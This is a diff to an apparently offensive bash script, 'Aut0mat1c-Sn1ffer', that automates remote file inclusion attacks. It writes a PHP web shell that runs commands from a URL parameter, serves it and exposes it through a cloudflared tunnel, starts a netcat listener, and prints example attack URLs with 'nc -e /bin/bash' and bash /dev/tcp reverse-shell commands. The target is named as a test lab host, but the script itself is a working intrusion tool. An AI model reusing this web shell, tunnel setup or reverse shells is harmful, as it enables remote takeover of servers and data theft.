@@ -2,6 +2,7 @@
 sudo apt update
 sudo apt install xterm
 sudo apt install python3
+sudo apt install cloudflared
 cd ..;cd ..;cd ..;cd ..;
 cd X || mkdir X && cd X
 clear
@@ -21,7 +22,7 @@ echo -e "${RED}--| Created By UMIT SAMET TASCI |--"
 echo -e "-------| Aut0mat1c-Sn1ffer |-------${NC}"
 sleep 1
 
-cat <<EOF > kabuk.txt
+cat <<EOF > shell.txt
 <?php
 if(isset(\$_GET['cmd'])) {
     echo "<pre>";
@@ -46,12 +47,15 @@ check_port() {
 check_port $HTTP_PORT
 check_port $NC_PORT
 
-xterm -T "Payload Server" -geometry 80x30+0+0 -hold -e "python3 -m http.server $HTTP_PORT" &
+xterm -T "Payload Server" -geometry 80x30+0+0 -hold -e \
+"python3 -m http.server $HTTP_PORT;
+ clear; 
+ cloudflared tunnel --url http://localhost:80" &
 
 xterm -T "NC Listener" -geometry 80x30+494+0 -hold -e \
 "echo -e '${GREEN}Listening...${NC}'; 
  echo '--------------------------------------------------';
- echo 'Example: http://ninja.testlab.local/index.php?page=http://192.168.111.100/kabuk.txt?&cmd=nc -e /bin/bash 192.168.111.100 4444%00';
+ echo 'Example: http://ninja.testlab.local/index.php?page=https://random-name.trycloudflare.com/shell.txt?&cmd=nc -e /bin/bash 192.168.111.100 4444%00';
  echo 'REV: bash -i >& /dev/tcp/$MY_IP/$NC_PORT 0>&1';
  echo '--------------------------------------------------';
  nc -lvp $NC_PORT" &
